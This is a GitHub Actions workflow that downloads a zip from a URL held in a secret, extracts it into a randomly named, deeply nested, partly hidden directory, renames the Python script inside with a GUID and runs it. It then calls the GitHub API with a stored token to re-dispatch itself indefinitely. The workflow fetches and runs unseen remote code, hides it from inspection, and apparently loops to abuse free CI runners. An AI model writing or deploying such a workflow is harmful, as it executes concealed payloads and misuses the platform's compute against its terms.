name: Maf

on:
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  export-and-run:
    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      # ===== PYTHON SETUP =====
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      # ===== INSTALL DEPENDENCIES =====
      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install selenium webdriver-manager

      # ===== GENERATE NAMES =====
      - name: Generate random names and nested directory
        id: names
        shell: pwsh
        run: |
          $ZIP_NAME = [guid]::NewGuid().ToString() + ".zip"
          $SCRIPT_PREFIX = [guid]::NewGuid().ToString()

          $DEPTH = Get-Random -Minimum 14 -Maximum 21
          $NESTED_DIR = ""

          for ($i=0; $i -lt $DEPTH; $i++) {
              $name = ([guid]::NewGuid().ToString().Split('-')[0])
              if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
                  $name = "." + $name
              }
              if ($NESTED_DIR -eq "") {
                  $NESTED_DIR = $name
              } else {
                  $NESTED_DIR = "$NESTED_DIR\$name"
              }
          }

          New-Item -ItemType Directory -Force -Path $NESTED_DIR | Out-Null

          echo "ZIP_NAME=$ZIP_NAME" >> $env:GITHUB_ENV
          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> $env:GITHUB_ENV
          echo "NESTED_DIR=$NESTED_DIR" >> $env:GITHUB_ENV

      # ===== DOWNLOAD ZIP =====
      - name: Download ZIP
        shell: pwsh
        run: |
          $path = "$env:NESTED_DIR\$env:ZIP_NAME"
          Invoke-WebRequest -Uri "${{ secrets.VIA }}" -OutFile $path

      # ===== UNZIP =====
      - name: Extract ZIP
        shell: pwsh
        run: |
          Expand-Archive -Path "$env:NESTED_DIR\$env:ZIP_NAME" -DestinationPath "$env:NESTED_DIR"
          Remove-Item "$env:NESTED_DIR\$env:ZIP_NAME"

      # ===== FIND PYTHON SCRIPT =====
      - name: Find Python script
        shell: pwsh
        run: |
          $script = Get-ChildItem -Path $env:NESTED_DIR -Recurse -Filter *.py | Select-Object -First 1

          if (-not $script) {
              Write-Error "No Python script found"
              exit 1
          }

          $newName = "$env:SCRIPT_PREFIX" + "_" + (Get-Date -Format "yyyyMMddHHmmss") + ".py"
          $newPath = Join-Path $env:NESTED_DIR $newName

          Move-Item $script.FullName $newPath

          echo "EXEC_SCRIPT=$newPath" >> $env:GITHUB_ENV

      # ===== RUN SCRIPT =====
      - name: Run Python script
        shell: pwsh
        run: |
          python "$env:EXEC_SCRIPT"

      # ===== TRIGGER NEXT RUN =====
      - name: Trigger next run
        shell: pwsh
        run: |
          $token = "${{ secrets.REPO_PAT }}"
          if (-not $token) { $token = "${{ secrets.GITHUB_TOKEN }}" }

          $body = @{ ref = "${{ github.event.repository.default_branch }}" } | ConvertTo-Json

          Invoke-RestMethod `
            -Uri "https://api.github.com/repos/${{ github.repository }}/actions/workflows/main.yml/dispatches" `
            -Headers @{ Authorization = "Bearer $token"; Accept = "application/vnd.github+json" } `
            -Method POST `
            -Body $body
